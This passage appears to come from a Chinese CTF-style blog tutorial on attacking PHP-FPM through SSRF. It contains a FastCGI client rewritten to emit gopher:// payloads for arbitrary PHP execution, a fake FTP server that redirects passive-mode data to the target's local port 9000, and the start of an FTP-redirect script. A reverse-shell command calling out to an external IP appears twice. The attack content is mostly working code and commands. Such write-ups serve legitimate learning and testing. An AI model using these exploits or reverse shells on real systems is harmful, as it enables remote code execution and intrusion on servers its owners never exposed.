 self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__connect</span>(<span class="params">self</span>):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#return True</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="comment"># 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request</span></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__waitForResponse</span>(<span class="params">self, requestId</span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_ssrf = urlparse.quote(client.request(params, content))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="built_in">str</span>(args.port) + <span class="string">&quot;/_&quot;</span> + request_ssrf)</span><br></pre></td></tr></table></figure>
+
+<p>用法依旧:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm2.py -c &quot;&lt;?php system(&#x27;ls&#x27;); exit(); ?&gt;&quot; -p 9000 127.0.0.1 /var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<p>​	注:这里执行的命令的起始路径是我们传入的这个文件,例如<code>/var/www/html/index.php</code>这个</p>
+<p><strong>神了,从下午2点搭这个b环境打ssrf一直有问题,mb的最后发现是hcj的sb docker模板拉的是轻量级煞笔php,最后自己重新拉了个ubuntu配的php,nginx,php-fpm才好使,服了!!!!!</strong></p>
+<h2 id="使用Gopherus"><a href="#使用Gopherus" class="headerlink" title="使用Gopherus"></a>使用Gopherus</h2><p>gopherus确实牛逼,输入:<code>python2 gopherus.py --exploit fastcgi</code>后路径再输入已确定存在的php文件的路径,再输入要执行的命令即可.</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240922211139.png" alt="image-20240922211137736" data-caption="image-20240922211137736" loading="lazy"></p>
+<p>效果:</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240922211200.png" alt="image-20240922211159505" data-caption="image-20240922211159505" loading="lazy"></p>
+<h1 id="SSRF中的攻击点"><a href="#SSRF中的攻击点" class="headerlink" title="SSRF中的攻击点"></a>SSRF中的攻击点</h1><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><p>很经典的能进行ssrf的函数,能支持file,dict,gopher等伪协议.</p>
+<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>可以从指定路径来获取资源,不支持gopher协议</p>
+<h2 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a>sockopen()</h2><p>这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<h1 id="FTP攻击FPM-FastCGI"><a href="#FTP攻击FPM-FastCGI" class="headerlink" title="FTP攻击FPM&#x2F;FastCGI"></a>FTP攻击FPM&#x2F;FastCGI</h1><h2 id="FTP的两种模式"><a href="#FTP的两种模式" class="headerlink" title="FTP的两种模式"></a>FTP的两种模式</h2><p>​	FTP会话包含了两个通道，控制通道和数据传输通道，FTP的工作有两种模式，一种是主动模式，一种是被动模式，以FTP Server为参照：主动模式，服务器主动连接客户端传输；被动模式，等待客户端的连接。</p>
+<ul>
+<li>主动模式:</li>
+</ul>
+<p>​	在主动模式下，FTP客户端随机开启一个大于1024的端口N向服务器的21号端口发起连接，然后开放N+1号端口进行监听，并向服务器发出PORT N+1命令。服务器接收到命令后，会用其本地的FTP数据端口（通常是20）来连接客户端指定的端口N+1，进行数据传输。</p>
+<ul>
+<li>被动模式:</li>
+</ul>
+<p>​	在被动模式下，FTP库户端随机开启一个大于1024的端口N向服务器的21号端口发起连接，同时会开启N+1号端口。然后向服务器发送PASV命令，通知服务器自己处于被动模式。服务器收到命令后，会开放一个大于1024的端口P进行监听，然后用PORT P命令通知客户端，自己的数据端口是P。客户端收到命令后，会通过N+1号端口连接服务器的端口P，然后在两个端口之间进行数据传输。</p>
+<p>​	总的来说，主动模式的FTP是指服务器主动连接客户端的数据端口，被动模式的FTP是指服务器被动地等待客户端连接自己的数据端口。</p>
+<p>​	由此可见,在被动模式中,FTP客户端和服务端的数据传输端口是由服务端指定的,实际上除了端口,服务器的地址也是可以被指定的.由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">227 Entering Passive Mode(192,168,9,2,4,8)</span><br></pre></td></tr></table></figure>
+
+<p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 <code>(192,168,9,2,4,8)</code> 代表让客户端到连接 192.168.9.2 的 4 * 256 + 8 &#x3D; 1032 端口。</p>
+<p>​	这样，假如我们指定 <code>(127,0,0,1,0,9000)</code> ，那么便可以将地址和端口指到 127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000 端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个<strong>重定向 Payload</strong> 的内容。</p>
+<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>例:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个经典的写文件函数,但是假如没有权限写文件我该怎么利用呢?那么就可以利用ssrf来打.</p>
+<p>ssrf通常能使用gopher:&#x2F;&#x2F;协议来打,但是这个函数不支持,如果内网存在PHP-FPM的话,那么我们就可以利用FTP的被动模式来攻击FPM.</p>
+<p>起一个伪ftp客户端:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># evil_ftp.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))        <span class="comment"># ftp服务绑定23号端口</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line"><span class="comment"># &quot;127,0,0,1&quot;PHP-FPM服务为受害者本地，&quot;9000&quot;为为PHP-FPM服务的端口号</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<p>使用Gopherus生成一个打FPM反弹shell的payload,只取_后面的值.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php </span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/103.150.11.108/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/tuchuang/20240924220216.png" alt="image-20240924213646912" data-caption="image-20240924213646912" loading="lazy"></p>
+<p>nc监听2333端口,传参即可反弹shell</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/tuchuang/20240924220152.png" alt="image-20240924214005710" data-caption="image-20240924214005710" loading="lazy"></p>
+<h2 id="读取写回文件"><a href="#读取写回文件" class="headerlink" title="读取写回文件"></a>读取写回文件</h2><p>​	例如CVE-2021-3129这个漏洞,核心就是传入 file_get_contents() 和 file_put_contents() 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到RCE的效果.</p>
+<p>示例代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$contents</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到,这段代码的主要功能就是先读取一个文件,再把这个文件的内容写到这个文件里,相当于啥也没干.</p>
+<p>file_get_contents我们经常用来进行ssrf,其支持各种伪协议,假如我们使用ftp协议的话,传入</p>
+<p><code>viewFile=ftp://evil-server/file.txt</code>的话,那么就会发生以下步骤:</p>
+<ol>
+<li>先通过file_get_contents()连接到我们的ftp服务器,下载file.txt</li>
+<li>再通过file_put_contents()连接到ftp服务器,并将其上传回file.txt</li>
+</ol>
+<p>​	那么我们依旧搭一个evilftp服务器,先从服务器上下载文件后,当他试图传回文件的时候,我们再告诉他把文件发送到127.0.0.1:9000,这样我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包,然后就能任意代码执行了.</p>
+<p>依旧使用Gopherus生成payload:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php </span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/103.150.11.108/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>evilftpredict.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/1/13 6:56 下午</span></span><br><span class="line"><span class="comment"># @Author  : tntaxin</span></span><br><span class="line"><span class="comment"># @File    : ftp_redirect.py</span></span><br><span class="line"><span class="comment"># @Software:</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="comment"># 对gopherus生成的payload进行一次urldecode</span></span><br><span class="line">payload = unquote(<span class="string">&quot;     &quot;</span>)</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">1234</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span 